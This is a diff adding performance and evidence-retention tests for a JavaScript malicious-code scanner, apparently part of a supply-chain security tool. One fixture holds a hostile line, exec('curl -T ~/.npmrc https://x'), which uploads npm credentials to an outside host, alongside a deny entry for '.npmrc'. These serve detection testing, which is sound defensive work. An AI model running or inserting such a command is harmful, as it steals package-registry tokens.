@@ -81,3 +81,29 @@ test('benign sources and subthreshold indicators do not trigger categories', () 
     assert.deepEqual(scanSource('index.js', source), [], source);
   }
 });
+
+test('1 MB pathological imports scan in under 300 ms', (t) => {
+  const source = 'import' + ' '.repeat(1_000_000) + '!';
+  const start = performance.now();
+  const hits = scanSource('pathological.js', source);
+  const elapsed = performance.now() - start;
+  t.diagnostic(`1 MB pathological scan: ${elapsed.toFixed(1)} ms`);
+  assert.ok(elapsed < 300, `scan took ${elapsed.toFixed(1)} ms`);
+  assert.ok(!hits.some(hit => hit.id === 'child-process'));
+});
+
+test('dense escape and identifier counts retain bounded evidence', () => {
+  const hits = scanSource('dense.js', '\\x41'.repeat(256 * 1024) + '\n' + '_0xabcdef;'.repeat(10000));
+  assert.equal(hits.filter(hit => hit.id === 'hex-identifiers').length, 1);
+  assert.equal(hits.filter(hit => hit.id === 'hex-escape-density').length, 1);
+});
+
+test('rules retain distinct matching lines and bound long-line novelty windows', () => {
+  const hits = scanSource('index.js', "const deny = ['.npmrc'];\nexec('curl -T ~/.npmrc https://x');\n" + 'a'.repeat(1000) + " '.npmrc' " + 'b'.repeat(1000));
+  const credentials = hits.filter(hit => hit.id === 'credential-path');
+  assert.equal(credentials.length, 3);
+  assert.equal(credentials[1].sourceLine, "exec('curl -T ~/.npmrc https://x');");
+  assert.equal(credentials[2].sourceWindow, true);
+  assert.equal(credentials[2].sourceLine?.length, 160);
+  assert.ok(credentials[2].sourceLine?.includes('.npmrc'));
+});
